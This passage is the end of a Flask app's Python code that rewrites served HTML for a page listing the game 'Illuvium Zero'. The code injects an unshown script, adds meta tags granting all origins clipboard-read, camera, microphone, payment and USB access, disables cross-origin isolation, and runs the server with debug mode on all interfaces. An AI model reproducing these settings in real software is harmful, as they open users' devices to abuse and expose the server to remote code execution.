                        <h3>Illuvium Zero</h3>
                        <p>Build and manage your own industrial complex in this resource management game.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    """
    
    # Insert the script and styles before closing body tag
    html = html.replace('</body>', script_content + '</body>')
    
    # Add permission meta tags
    permission_meta_tags = """
    <meta http-equiv="Permissions-Policy" content="clipboard-read=*, clipboard-write=*, web-share=*, accelerometer=*, ambient-light-sensor=*, camera=*, geolocation=*, gyroscope=*, magnetometer=*, microphone=*, payment=*, usb=*, interest-cohort=()">
    <meta http-equiv="Cross-Origin-Opener-Policy" content="unsafe-none">
    <meta http-equiv="Cross-Origin-Embedder-Policy" content="unsafe-none">
    <meta http-equiv="Cross-Origin-Resource-Policy" content="cross-origin">
    """
    html = html.replace('</head>', permission_meta_tags + '</head>')
    
    return html

# Run the app with a different port when executed directly
if __name__ == '__main__':
    logger.info(f"Flask routes: {app.url_map}")
    app.run(host='0.0.0.0', port=8000, debug=True)